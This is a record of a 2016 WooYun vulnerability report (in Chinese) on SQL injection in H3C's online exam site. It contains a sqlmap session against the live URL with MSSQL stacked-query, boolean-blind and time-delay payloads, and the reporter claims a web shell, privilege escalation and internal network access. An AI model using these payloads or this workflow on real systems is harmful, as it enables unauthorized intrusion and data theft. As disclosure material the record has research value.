{"id": 73003, "wybug_id": "wooyun-2016-0171535", "wybug_title": "华三通信考试系统Getshell可内网(影响几十台内网终端安全)", "wybug_corp": "华三通信", "wybug_author": "路人甲", "wybug_date": "2016-01-21 10:24", "wybug_open_date": "2016-01-26 10:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： rt整个大学一半多的时间都要学h3c不知道为什么。。。display。。。 详细说明：  https://iexam.h3c.com/customize/nwc_user_enterprise/login/login.html使用了新为软件系统可注入，getshell\nroot@kali:/usr/share/sqlmap/output# sqlmap -u \"https://iexam.h3c.com/site/ajax/WebSiteAjax.aspx?type=hits&ContentUid=123*\"    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 23:19:36custom injection marking character ('*') found in option '-u'. Do you want to process it? [Y/n/q] y[23:19:42] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: Microsoft SQL Server/Sybase stacked conditional-error blind queries    Payload: https://iexam.h3c.com:443/site/ajax/WebSiteAjax.aspx?type=hits&ContentUid=123'; IF(3655=3655) SELECT 3655 ELSE DROP FUNCTION PflM--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: https://iexam.h3c.com:443/site/ajax/WebSiteAjax.aspx?type=hits&ContentUid=123'; WAITFOR DELAY '0:0:5'-----[23:19:46] [INFO] testing Microsoft SQL Server[23:19:47] [INFO] confirming Microsoft SQL Server[23:19:48] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008[23:19:48] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 1 times[23:19:48] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/iexam.h3c.com'\n\nrieval[23:29:08] [INFO] retrieved: [23:29:10] [WARNING] time-based comparison requires larger statistical model, please wait...........................do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y[23:29:37] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors 5[23:29:50] [INFO] retrieved: [23:29:56] [INFO] retrieved: master[23:34:03] [INFO] retrieved: [23:34:07] [INFO] retrieved: mode\n延时就不慢慢跑了   漏洞证明：  \n\n内网ip\n\n大量内外机器\n\n开了3389但是没有lcx转发出来，不知为什么，家里网差代理一直没有搞上去55555 已提权\n\n\n\n\n\n   修复方案：  修改   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-01-26 10:30 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-21 10:28 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:1540 漏洞数:224        | 90Sec@Team)\t\t \n  我也不知道为什么我的同学也去了~~    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}